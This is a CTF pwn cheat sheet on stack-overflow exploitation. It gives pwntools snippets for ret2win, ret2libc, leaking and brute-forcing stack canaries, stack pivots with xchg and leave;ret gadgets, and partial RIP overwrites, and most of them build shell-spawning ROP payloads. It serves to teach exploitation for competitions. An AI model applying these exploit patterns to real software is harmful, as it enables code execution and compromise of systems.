# CTF Pwn - Stack Overflow

## Table of Contents
- [Basic ret2win](#basic-ret2win)
- [ret2libc (No PLT, Using GOT)](#ret2libc-no-plt-using-got)
- [Stack Canary Bypass](#stack-canary-bypass)
  - [Leak Canary via Format String](#leak-canary-via-format-string)
  - [One-Byte Overflow to Crack Canary](#one-byte-overflow-to-crack-canary)
- [Stack Pivot](#stack-pivot)
  - [xchg rsp, rax / xchg rbp, rax Gadget](#xchg-sprsp-rax--xchg-rbp-rax-gadget)
  - [leave; ret Gadget (Double Pivot)](#leave-ret-gadget-double-pivot)
- [Partial Overwrite](#partial-overwrite)
- [pwntools Offset Finding](#pwntools-offset-finding)

---

## Basic ret2win

**Pattern:** Buffer overflow with no PIE, no canary, NX may be on/off.

```python
from pwn import *

elf = ELF('./binary')
# Find win function
win_addr = elf.symbols['win']
payload = b'A' * offset + p64(win_addr)
```

---

## ret2libc (No PLT, Using GOT)

**Pattern:** No PLT entry for libc functions, but GOT is writable.

```python
# Leak libc address via GOT
p.recvuntil(b'gift: ')
libc_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = libc_addr - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

# ROP chain
rop = ROP(libc)
rop.call('puts', [elf.got['puts']])  # leak libc
rop.call('system', [binsh])
```

---

## Stack Canary Bypass

### Leak Canary via Format String

If binary has format string vuln anywhere:
```python
# %23$p leaks canary if it's at position 23
p.sendline(b'%23$p')
canary = int(p.recvline(), 16)
```

### One-Byte Overflow to Crack Canary

If canary is stable across runs (no fork):
```python
for i in range(256):
    payload = b'A' * offset + bytes([i])
    p.send(payload)
    if b'correct' in p.recv():
        canary_byte = i
        break
# After one byte known, overflow to next position
```

---

## Stack Pivot

### xchg rsp, rax / xchg rbp, rax Gadget

```python
# Useful for small overflows: control rax before overflow completes
POP_RAX = 0x401000
XCHG_RSP_RAX = 0x4011d2  # xchg rsp, rax; ret

# Stage 1: set rax to BSS stage address
payload = b'A' * offset + p64(POP_RAX) + p64(BSS_STAGE)
payload += p64(XCHG_RSP_RAX)  # rsp = rax = BSS_STAGE

# Now stack points to BSS — write ROP chain there
payload += p64(POP_RDI) + p64(binsh_addr)
payload += p64(system)
```

### leave; ret Gadget (Double Pivot)

**When to use:** Small overflow (22 bytes) — too small for ROP chain. No libc leak. Binary has `fgets`/`read` in PLT.

```python
BSS_STAGE = 0x404500
LEAVE_RET = 0x4013d9  # leave; ret

# Stage 1: pivot to BSS
payload = b'A' * 128
payload += p64(BSS_STAGE)   # overwrite RBP → BSS
payload += p64(LEAVE_RET)   # leave: rsp = rbp (BSS), then ret

# Stage 2: from BSS, call fgets to read full ROP chain
# Pre-place bootstrap ROP on BSS
stage2 = flat(
    POP_RDI, BSS_STAGE + 0x100,   # fgets destination
    POP_RSI_R15, 0x700, 0,        # size
    elf.plt['fgets'],
    BSS_STAGE + 0x100,             # return into new chain
)
```

**Key insight:** `leave; ret` = `mov rsp, rbp; pop rbp; ret`. Overwriting RBP controls RSP after `leave`. Two pivots solve "too small for ROP": first pivot → BSS → `fgets` loads full chain.

---

## Partial Overwrite

**Pattern:** 1-byte overflow to overwrite only the lower byte of RIP.

```python
# Useful when high bytes of address are deterministic (PIE base, heap, etc.)
# Overwrite only lower byte to jump to nearby gadget
payload = b'A' * offset + b'\xd2'  # lower byte of xchg_rsp_rax gadget
```

---

## pwntools Offset Finding

```python
def find_offset(exe):
    p = process(exe, level='warn')
    p.sendlineafter(b'>', cyclic(500))
    p.wait()
    offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))
    log.warn(f'Offset: {offset}')
    return offset
```

---

For ROP chain building (ret2csu, bad char bypass, exotic gadgets), see [rop-techniques.md](rop-techniques.md).

For canary bypass via one-byte overflow and other advanced stack tricks, see [advanced-pwn.md](advanced-pwn.md).
